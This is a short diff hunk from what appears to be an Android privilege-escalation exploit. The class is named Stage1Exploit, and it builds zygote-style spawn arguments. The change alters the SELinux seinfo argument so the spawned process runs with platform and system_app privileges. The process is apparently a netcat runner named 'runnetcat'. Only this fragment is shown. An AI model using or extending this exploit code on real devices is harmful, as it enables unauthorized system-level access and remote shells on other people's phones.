@@ -192,7 +192,7 @@ class Stage1Exploit:
             "--setgroups=3003",
             "--runtime-args",
             "--target-sdk-version=28",
-            "--seinfo=network_stack:privapp:targetSdkVersion=28:complete",
+            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete",
             "--nice-name=runnetcat",
             "--mount-external-default",
             "--runtime-flags=1",
